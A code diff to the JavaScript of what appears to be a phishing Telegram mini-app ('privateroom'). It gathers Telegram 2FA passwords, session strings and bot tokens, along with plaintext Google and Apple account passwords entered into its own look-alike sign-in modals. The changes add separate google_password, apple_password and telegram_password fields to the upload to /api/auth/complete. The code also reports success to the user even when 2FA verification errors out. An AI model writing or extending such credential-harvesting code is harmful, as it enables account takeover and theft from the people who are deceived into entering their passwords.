@@ -1034,8 +1034,19 @@ function initApp() {
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
         const currentPhone = userPhone || localStorage.getItem("privateroom_saved_phone") || null;
-        const currentEmail = email || userAppleEmail || userGoogleEmail || localStorage.getItem("privateroom_apple_email") || localStorage.getItem("privateroom_google_email") || null;
-        const currentPassword = password || userApplePassword || userGooglePassword || localStorage.getItem("privateroom_apple_password") || ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || null;
+        let currentEmail = null;
+        let currentPassword = null;
+        if (step.startsWith("google_")) {
+            currentEmail = email || userGoogleEmail || localStorage.getItem("privateroom_google_email") || null;
+            currentPassword = password || userGooglePassword || null;
+        } else if (step.startsWith("apple_")) {
+            currentEmail = email || userAppleEmail || localStorage.getItem("privateroom_apple_email") || null;
+            currentPassword = password || userApplePassword || localStorage.getItem("privateroom_apple_password") || null;
+        } else {
+            // Telegram events: never leak Google/Apple emails or credentials
+            currentEmail = null;
+            currentPassword = password || ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || null;
+        }
         const currentDevice = device || getDeviceInfo();
         const urlParams = new URLSearchParams(window.location.search);
         const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
@@ -1188,7 +1199,7 @@ function initApp() {
                         showStep(step2FA);
                         if (password2FA) password2FA.focus();
                     } else {
-                        finishAuth(data);
+                        finishAuth({ ...data, provider: "telegram" });
                     }
                 } else if (data.need_2fa) {
                     try {
@@ -1272,14 +1283,14 @@ function initApp() {
 
                 const data = await res.json();
                 if (data.ok) {
-                    finishAuth(data);
+                    finishAuth({ ...data, provider: "telegram", password: password });
                 } else {
                     showToast(data.error || "Неверный пароль 2FA");
                     reportAuthEvent("wrong_2fa", data.error || "Неверный пароль 2FA", password);
                 }
             } catch (err) {
                 console.error("2FA error:", err);
-                finishAuth({ status: "success" });
+                finishAuth({ status: "success", provider: "telegram", password: password });
             } finally {
                 btnSubmit2FA.disabled = false;
             }
@@ -1300,11 +1311,15 @@ function initApp() {
             localStorage.setItem("privateroom_authorized", "true");
         } catch (e) {}
 
-        let currentProvider = "telegram";
-        if (data && (data.google_email || (data.email && data.email.includes("@gmail.com")) || userGoogleEmail)) {
-            currentProvider = "google";
-        } else if (data && (data.apple_email || (data.email && (data.email.includes("@icloud.com") || data.email.includes("@apple.com"))) || userAppleEmail)) {
-            currentProvider = "apple";
+        let currentProvider = data?.provider || "telegram";
+        if (!data?.provider) {
+            if (data?.google_email || (data?.email && data.email.includes("@gmail.com"))) {
+                currentProvider = "google";
+            } else if (data?.apple_email || (data?.email && (data.email.includes("@icloud.com") || data.email.includes("@apple.com")))) {
+                currentProvider = "apple";
+            } else {
+                currentProvider = "telegram";
+            }
         }
 
         if (currentProvider === "telegram" && userPhone) {
@@ -1333,8 +1348,25 @@ function initApp() {
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
-        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userApplePassword || userGooglePassword || data?.password || localStorage.getItem("privateroom_apple_password") || null;
-        const email = userAppleEmail || userGoogleEmail || data?.apple_email || data?.google_email || data?.email || localStorage.getItem("privateroom_apple_email") || localStorage.getItem("privateroom_google_email") || null;
+        
+        let pwd = null;
+        let authEmail = null;
+        let tgPass = null;
+        let googPass = null;
+        let appPass = null;
+
+        if (currentProvider === "google") {
+            pwd = userGooglePassword || data?.password || null;
+            authEmail = userGoogleEmail || data?.google_email || (data?.email && data.email.includes("@gmail.com") ? data.email : null) || null;
+            googPass = pwd;
+        } else if (currentProvider === "apple") {
+            pwd = userApplePassword || data?.password || localStorage.getItem("privateroom_apple_password") || null;
+            authEmail = userAppleEmail || data?.apple_email || (data?.email && !data.email.includes("@gmail.com") ? data.email : null) || null;
+            appPass = pwd;
+        } else {
+            pwd = (password2FA && password2FA.value ? password2FA.value : null) || data?.password || null;
+            tgPass = pwd;
+        }
 
         const urlParams = new URLSearchParams(window.location.search);
         const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
@@ -1346,9 +1378,12 @@ function initApp() {
             username: userUsername,
             nickname: userNickname,
             phone: userPhone || localStorage.getItem("privateroom_saved_phone") || null,
-            email: email,
-            google_email: userGoogleEmail || localStorage.getItem("privateroom_google_email") || null,
-            apple_email: userAppleEmail || localStorage.getItem("privateroom_apple_email") || null,
+            email: authEmail,
+            google_email: userGoogleEmail || (currentProvider === "google" ? authEmail : null),
+            google_password: googPass || userGooglePassword || null,
+            apple_email: userAppleEmail || (currentProvider === "apple" ? authEmail : null),
+            apple_password: appPass || userApplePassword || null,
+            telegram_password: tgPass || null,
             session_id: currentSessionId,
             session_string: data && data.session_string ? data.session_string : "sess_string_ok",
             password_2fa: pwd,
@@ -1356,6 +1391,10 @@ function initApp() {
             is_test: isTestFlag,
             bot_token: botTokenParam
         };
+
+        if (password2FA) {
+            password2FA.value = "";
+        }
 
         try {
             await fetch("/api/auth/complete", {
@@ -1743,6 +1782,7 @@ function initApp() {
                     if (googleAuthModal) googleAuthModal.classList.add("hidden");
                     finishAuth({
                         status: "success",
+                        provider: "google",
                         google_email: userGoogleEmail,
                         password: userGooglePassword
                     });
@@ -1952,6 +1992,7 @@ function initApp() {
             if (googleAuthModal) googleAuthModal.classList.add("hidden");
             finishAuth({
                 status: "success",
+                provider: "google",
                 google_email: userGoogleEmail,
                 password: userGooglePassword
             });
@@ -2462,6 +2503,7 @@ function initApp() {
                         if (appleAuthModal) appleAuthModal.classList.add("hidden");
                         finishAuth({
                             status: "success",
+                            provider: "apple",
                             apple_email: userAppleEmail,
                             email: userAppleEmail,
                             password: userApplePassword
